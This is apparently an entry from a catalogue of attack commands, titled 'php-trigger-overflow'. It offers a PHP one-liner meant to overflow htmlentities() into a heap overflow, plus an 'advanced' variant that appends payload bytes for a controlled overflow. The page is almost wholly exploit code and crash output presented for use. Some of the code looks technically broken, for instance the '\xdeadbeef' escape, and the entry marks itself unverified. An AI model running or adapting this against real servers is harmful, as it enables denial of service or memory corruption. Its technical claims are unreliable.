---
data: >-
  <?php ini_set('memory_limit',-1); $s=str_repeat("A",PHP_INT_MAX);
  htmlentities($s,0,"",true); ?>
tags:
  - php
  - overflow
  - exploit
type: command
executor: php
platforms:
  - Linux
  - PHP
id: 65c5a13f-28c7-4e00-8171-80f4159c708f
created_at: '2025-12-14T17:28:13.062Z'
updated_at: '2025-12-14T17:28:13.062Z'
verified: false
validated: true
submitted: true
---
# php-trigger-overflow

## Command

```php
<?php ini_set('memory_limit',-1); $s=str_repeat("A",PHP_INT_MAX); htmlentities($s,0,"",true); ?>
```

## Description

This PHP script triggers the integer overflow vulnerability in htmlentities() by creating a string of maximum length (PHP_INT_MAX on 32-bit) and processing it, leading to undersized allocation and potential heap overflow.

## Parameters

| Parameter | Description | Required |
|-----------|-------------|----------|
| memory_limit | Set to -1 for unlimited memory | Yes |
| str_repeat length | PHP_INT_MAX to force overflow | Yes |
| htmlentities flags | 0 (ENT_COMPAT), empty charset, double_encode true | Yes |

## Examples

### Basic Usage

Save as trigger.php and run `php trigger.php`.

```php
<?php ini_set('memory_limit',-1); $s=str_repeat("A",PHP_INT_MAX); htmlentities($s,0,"",true); ?>
```

### Advanced Usage

Modify for payload: Append exploit data to $s for controlled overflow.

```php
<?php ini_set('memory_limit',-1); $s=str_repeat("A",PHP_INT_MAX)."\xdeadbeef"; htmlentities($s,0,"",true); ?>
```

## Expected Output

Heap overflow leading to SIGSEGV when run under debugger; without, may crash or hang due to memory issues.

## Related

- [[Related Procedure]]
